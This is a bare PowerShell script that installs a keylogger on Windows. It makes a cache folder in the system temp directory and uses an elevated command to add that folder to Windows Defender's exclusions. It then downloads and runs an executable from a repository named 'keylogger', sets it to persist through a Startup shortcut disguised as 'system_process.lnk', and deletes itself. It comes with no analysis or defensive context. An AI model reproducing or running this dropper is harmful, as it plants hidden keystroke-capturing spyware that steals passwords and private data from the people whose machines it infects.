mkdir "$env:windir\temp\Cache"
Start-Process powershell -Verb RunAs -ArgumentList 'New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\Windows\Temp\Cache" -Value "C:\Windows\Temp\Cache" -PropertyType String -Force'
Invoke-WebRequest -Uri "https://github.com/wishtag/keylogger/raw/refs/heads/main/dist/main.exe" -OutFile "$env:windir\temp\Cache\main.exe"
Start-Process "$env:windir\temp\Cache\main.exe"
$s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\system_process.lnk");$s.TargetPath="$env:windir\temp\Cache\main.exe";$s.Save()
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
EXIT